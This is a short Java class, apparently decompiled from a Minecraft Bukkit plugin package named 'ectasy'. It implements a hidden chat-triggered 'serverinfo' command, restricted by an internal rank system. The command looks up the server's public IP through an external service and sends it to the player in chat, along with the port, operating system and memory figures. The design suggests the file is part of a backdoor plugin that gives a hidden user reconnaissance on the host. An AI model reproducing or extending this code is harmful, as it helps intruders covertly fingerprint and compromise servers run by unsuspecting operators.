package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import java.net.URL;
import org.apache.commons.io.IOUtils;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "serverinfo",
   description = "Gets info about the server",
   blatant = false,
   rank = Rank.DEVELOPER,
   aliases = {"si"}
)
public class ServerInfoCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      try {
         URL var4 = new URL("https://api.ipify.org/");
         String var5 = IOUtils.readLines(var4.openStream()).get(0);
         Runtime var6 = Runtime.getRuntime();
         long var7 = (var6.totalMemory() - var6.freeMemory()) / 1048576L;
         long var9 = var6.maxMemory() / 1048576L;
         ChatUtil.sendChat(var1.getPlayer(), "--------------------------------------");
         ChatUtil.sendChat(var1.getPlayer(), "IP : " + var5);
         ChatUtil.sendChat(var1.getPlayer(), "Port : " + Bukkit.getPort());
         ChatUtil.sendChat(var1.getPlayer(), "OS : " + System.getProperty("os.name") + "(" + System.getProperty("os.version") + ")");
         ChatUtil.sendChat(var1.getPlayer(), "RAM : " + var7 + "/" + var9);
         ChatUtil.sendChat(var1.getPlayer(), "--------------------------------------");
      } catch (Exception var11) {
         ChatUtil.sendChat(var1.getPlayer(), "Could not get server info.");
      }
   }
}
